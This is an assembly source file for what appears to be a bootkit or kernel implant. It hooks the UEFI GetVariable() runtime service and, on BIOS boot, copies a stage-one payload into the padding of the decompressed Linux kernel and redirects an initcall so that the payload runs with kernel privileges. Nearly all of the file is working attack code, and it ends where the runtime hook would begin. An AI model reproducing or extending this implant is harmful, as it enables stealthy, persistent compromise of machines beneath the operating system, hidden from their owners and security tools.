BITS 64


; The original GetVariable()
_original:
    dq 0

_to_restore:
    dq 0

; This entry means we got here via a UEFI runtime hook.
_uefi_entry:
; Read the top of the stack to get where we are called from
; This will be __efi_call + 40, so we can use this to get back to _text, which
    mov rax, [rsp]
    sub rax, __efi_call + 40

    push rbp
    mov rbp, rsp
    sub rsp, 0x40 
; Now do the usual register preservation
    push rcx
    push rdx
    push r8
    push r9
    push r10
    push r11

    mov rdi, rax
    mov rsi, 0
    call _runtime_hook

; get the registers back to normal
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdx
    pop rcx

    leave

; restore and call the original entry now that we've done own work.
    mov rax, [rel _original]
    push rbx
    mov rbx, [rel _to_restore]
    mov [rbx], rax
    pop rbx
    jmp rax

    align 32, db 0

; marker just to make building this easier, as we can get the offset via this.
    dd 0x41424344
    db "hack the planet", 0
    dd 0x61626364

; this is the code we call just after the kernel is decompressed if we boot via
; BIOS.
_bios_entry:
    push rax
    push rcx
    push rdi
    push rsi

; now we need patch the kernel and get stage1 in a suitable place.
 
; so the kernel pads sections with 0xcc, with a 0x20_00_00 alignment, so we
; have a ton of free space to place a payload.
; %define _stage1_offset 0x01_30_00_00
    lea rsi, [rel _bios_runtime_thunk]
    lea rdi, [rax + _stage1_offset]
    mov rcx, runtime_hook_len + (_runtime_hook - _bios_runtime_thunk)
    rep movsb


; hook initcall to call our stage1
; %define _initcall_offset 0x02_b6_ee_08
    ; (rax + _initcall_offset + value)
    ; 0xffdd6d48
    mov edi, _stage1_offset - _initcall_offset
    mov dword [rax + _initcall_offset], edi

; now we can transfer control over
    pop rsi
    pop rdi
    pop rcx
    pop rax
    jmp rax

; This is the code that will be copied into a cavity into the kernel image.
; So if get here we got patched into the kernel and called via an initcall.
_bios_runtime_thunk:
; Want to pass in our known address of _text
; In this case, it's RIP relative back.
    lea rdi, [rel $-_stage1_offset-_startup_64_offset]
    mov rsi, 1
    jmp _runtime_hook


; We just append this.
_runtime_hook:
